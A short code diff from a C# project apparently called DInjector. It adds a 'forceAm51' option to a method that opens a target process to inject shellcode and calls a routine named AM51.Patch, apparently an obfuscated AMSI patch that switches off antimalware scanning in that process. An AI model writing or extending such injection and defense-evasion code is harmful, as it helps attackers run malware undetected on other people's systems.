@@ -9,7 +9,7 @@ namespace DInjector
 {
     class RemoteThreadDll
     {
-        public static void Execute(byte[] shellcode, int processID, string moduleName, bool remoteAm51)
+        public static void Execute(byte[] shellcode, int processID, string moduleName, bool remoteAm51, bool forceAm51)
         {
             #region NtOpenProcess
 
@@ -28,7 +28,11 @@ namespace DInjector
             else
                 throw new Exception($"(RemoteThreadDll) [-] NtOpenProcess: {ntstatus}");
 
-            if (remoteAm51) AM51.Patch(hProcess, processID);
+            if (remoteAm51)
+                AM51.Patch(
+                    processHandle: hProcess,
+                    processID: processID,
+                    force: forceAm51);
 
             #endregion
 
